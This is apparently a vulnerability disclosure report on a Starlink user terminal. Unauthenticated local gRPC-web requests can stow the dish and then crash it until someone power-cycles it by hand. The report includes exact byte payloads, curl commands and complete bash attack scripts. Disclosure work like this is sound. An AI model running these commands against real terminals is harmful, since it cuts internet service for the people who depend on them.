# Render User Terminal Inoperative until Physical Power-cycle

## Overview of the Vulnerability

By sending malformed web requests from within the local network, the Starlink user terminal can be put into an inoperative state until it can be manually rebooted by physically power-cycling the terminal.

The control interface for Starlink user terminals uses gRPC-web to send administrative commands to the terminal.
These are intended to read and configure the state of the dish and are used by the [my.starlink.com](https://my.starlink.com) interface.
Commands are unauthenticated and can be sent from any device on the local network without requiring the web interface; direct gRPC and HTTP requests are also accepted.

By sending malformed commands, the system can enter into a state where future commands will be rejected until the terminal is manually rebooted.
This allows the attacker to first set the dish state through well-formed commands and then send a crafted command to prevent further change.
If the dish is placed into a "stowed" state, in which it is turned away from the sky, this will disable internet connectivity for as long as it takes to physically access the dish.


## Impact

This attack particularly impacts any customer where the network has many users, the dish is physically inaccessible, or the attacker can maintain a presence on the network.

Since the attack can be deployed from any device connected to the local network, large networks containing many untrusted users are at the greatest risk.
Such networks also suffer greater impact, as more devices are affected by network disruptions.
The impact is magnified when Starlink is the only source of internet access for that customer.
Examples may include maritime and aviation traffic, internet cafÃ©s, or large organisations.

Restoring service requires physical access to the terminal, so disruption will be increased where access is difficult or restricted.
Examples may include secured rooftop installations.

Although power cycling restores functionality, repeated attack execution results in continuous loss of service.
Therefore, attackers that can maintain presence on the network can have the greatest impact.


\pagebreak
## Steps to Reproduce

1. Connect to the WiFi network provided by the Starlink user terminal
2. Confirm that the web interface is operational by navigating to [my.starlink.com](https://my.starlink.com)
3. Send the "stow" command to the user terminal by running Command 1 (below) in a Unix terminal
4. Observe that the dish has tilted itself away from the sky, and internet connectivity has been interrupted
5. Send the malformed "kill" command to the user terminal by running Command 2 (below) in a Unix terminal
6. Observe that the following error message is displayed on [my.starlink.com](https://my.starlink.com): "Starlink Disconnected - Ensure your starlink is plugged in."
7. Refresh the [my.starlink.com](https://my.starlink.com) interface and observe that it will no longer load
8. Send Command 1 again, and observe that the user terminal is no longer responding to commands
9. Power-cycle the user terminal by unplugging it and plugging it back in
10. Observe that service has been restored


### Command 1: Stow

The following command sends the byte sequence `\x00\x00\x00\x00\x03\x92}\x00` to the user terminal, instructing the dish to put itself into a "stowed" state:
```bash
printf '\x00\x00\x00\x00\x03\x92}\x00' \
| curl 'http://192.168.100.1:9201/SpaceX.API.Device.Device/Handle' \
-X POST \
-H 'Accept: */*' \
-H 'Accept-Language: en-GB,en;q=0.5' \
-H 'content-type: application/grpc-web+proto' \
-H 'x-grpc-web: 1' \
--data-binary @- -v | xxd
```


### Command 2: Kill

The following command sends the byte sequence `\x00\x00\x00\x00\x03\xea>\x00` to the user terminal, causing it to enter an inoperative state in which it fails to respond to commands until physically power-cycled:
```bash
printf '\x00\x00\x00\x00\x03\xea>\x00' \
| curl 'http://192.168.100.1:9201/SpaceX.API.Device.Device/Handle' \
-X POST \
-H 'Accept: */*' \
-H 'Accept-Language: en-GB,en;q=0.5' \
-H 'content-type: application/grpc-web+proto' \
-H 'x-grpc-web: 1' \
--data-binary @- -v | xxd
```


## Proof of Concept

This attack was confirmed to work on two separate user terminals.
Both were first-generation models, with a circular dish.

A video demonstrating the end-to-end attack on a Starlink user terminal can be found at \url{https://drive.google.com/file/d/1jpUHh0J7kTSVw_FjfS18J836cpuMnOJF/view?usp=share_link}.
Similarly, the video at \url{https://drive.google.com/file/d/1zlP_wrz5ekTRm0KQegJOoyWPZHmVYFIf/view?usp=share_link} shows a screen recording of the attack.

At the end of this document, the exact shell scripts used in these experiments can be found.

Shown below are screenshots of the attack and its outcome.

The result of running the "stow" command shown above in the terminal:

![stow.png](./stow.png)

\pagebreak

The result of running the "stow" command followed by the "kill" command in the terminal:

![stow_and_kill.png](./stow_and_kill.png)

\pagebreak

The error returned when running "unstow" (similar to Command 1, unstows the dish) after having carried out the attack:

![unstow.png](./unstow.png)

\pagebreak

The error message shown on [my.starlink.com](https://my.starlink.com) after carrying out the attack:

![offline.png](./offline.png)


\pagebreak
## Attack Scripts

The shell scripts used in the attack videos and screenshots.


### stow

Sends a command to stow the dish.

```bash
#!/bin/bash

stow () {
    printf '\x00\x00\x00\x00\x03\x92}\x00' \
    | curl 'http://192.168.100.1:9201/SpaceX.API.Device.Device/Handle' \
    -X POST \
    -H 'Accept: */*' \
    -H 'Accept-Language: en-GB,en;q=0.5' \
    -H 'Accept-Encoding: gzip, deflate' \
    -H 'content-type: application/grpc-web+proto' \
    -H 'x-grpc-web: 1' \
    -H 'Origin: http://my.starlink.com' \
    -H 'Connection: keep-alive' \
    -H 'Referer: http://my.starlink.com/' \
    --data-binary @- -v | xxd
}

stow
```


### stow_and_kill

Sends a command to stow the dish, followed by the "kill" command, crashing the user terminal.

```bash
#!/bin/bash

stow () {
    printf '\x00\x00\x00\x00\x03\x92}\x00' \
    | curl 'http://192.168.100.1:9201/SpaceX.API.Device.Device/Handle' \
    -X POST \
    -H 'Accept: */*' \
    -H 'Accept-Language: en-GB,en;q=0.5' \
    -H 'content-type: application/grpc-web+proto' \
    -H 'x-grpc-web: 1' \
    --data-binary @- -v | xxd
}

kill_dish () {
    printf '\x00\x00\x00\x00\x03\xea>\x00' \
    | curl 'http://192.168.100.1:9201/SpaceX.API.Device.Device/Handle' \
    -X POST \
    -H 'Accept: */*' \
    -H 'Accept-Language: en-GB,en;q=0.5' \
    -H 'content-type: application/grpc-web+proto' \
    -H 'x-grpc-web: 1' \
    --data-binary @- -v | xxd
}

echo "STOWING DISH"
stow
sleep 1
echo "DISH STOWED"
sleep 0.5
echo "SENDING KILL COMMAND"
kill_dish
sleep 1
echo "HACK COMPLETE"
sleep 1
echo "GOODBYE"
```

### unstow

Sends a command to unstow the dish.

```bash
#!/bin/bash

unstow () {
    printf '\x00\x00\x00\x00\x05\x92}\x02\x08\x01' \
    | curl 'http://192.168.100.1:9201/SpaceX.API.Device.Device/Handle' \
    -X POST \
    -H 'Accept: */*' \
    -H 'Accept-Language: en-GB,en;q=0.5' \
    -H 'Accept-Encoding: gzip, deflate' \
    -H 'content-type: application/grpc-web+proto' \
    -H 'x-grpc-web: 1' \
    -H 'Origin: http://my.starlink.com' \
    -H 'Connection: keep-alive' \
    -H 'Referer: http://my.starlink.com/' \
    --data-binary @- -v | xxd
}

unstow
```
